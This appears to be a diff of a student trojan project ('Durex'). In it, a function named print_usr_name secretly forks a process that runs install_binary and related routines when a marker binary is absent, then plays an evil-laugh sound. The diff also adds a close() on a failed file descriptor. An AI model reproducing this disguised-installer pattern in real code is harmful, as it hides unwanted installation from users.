@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
-/*   Updated: 2018/08/14 01:48:48 by root             ###   ########.fr       */
+/*   Updated: 2018/08/21 06:09:45 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -31,6 +31,7 @@ static void			print_usr_name()
 		return ;
 	fd = open(DUREX_BINARY_FILE, O_RDONLY);
 	if (fd < 0) {
+		close(fd);
 		pid = fork();
 		if (pid == 0) {
 			int		(*process[])(void) = { &install_binary,
@@ -42,9 +43,8 @@ static void			print_usr_name()
 					return ;
 			}
 			system("mpg123 -q ./audio/Evil_Laugh.mp3 2>/dev/null");
+			exit(0);
 		}
-	} else {
-		close(fd);
 	}
 }
 
